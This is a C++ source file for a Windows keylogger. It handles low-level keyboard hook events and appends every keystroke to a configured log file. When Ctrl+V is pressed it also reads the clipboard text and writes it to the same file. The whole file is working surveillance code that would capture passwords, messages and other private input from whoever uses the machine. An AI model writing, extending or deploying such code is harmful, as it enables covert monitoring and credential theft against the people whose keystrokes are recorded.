#include "keylogger.h"
#include "keyboard.h"
#include "configuration.h"
#include "constants.h"

void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
{
    std::wofstream out_file{ configuration::out_file, std::wofstream::app };

    if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.end())
    {
        out_file << configuration::key_codes.at(kbd_hook->vkCode);
    }
    else if (keyboard::is_down(VK_CONTROL))
    {
        out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook->vkCode) << L']';

        if (kbd_hook->vkCode == VK_V)
        {
            write_clipboard_data(out_file);
        }
    }
    else
    {
        BYTE state[KEYBOARD_STATE_SIZE];
        keyboard::get_state(state);

        WCHAR key_buffer[PWSZ_BUFFER_SIZE];
        const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, PWSZ_BUFFER_SIZE, 0);

        if (result > 0) out_file << key_buffer;
    }
}

void keylogger::write_clipboard_data(std::wofstream& file)
{
    if (OpenClipboard(nullptr))
    {
        if (auto handle = GetClipboardData(CF_UNICODETEXT))
        {
            const auto data = GlobalLock(handle);
            if (data != NULL) file << static_cast<WCHAR*>(data);

            GlobalUnlock(handle);
        }

        CloseClipboard();
    }
}
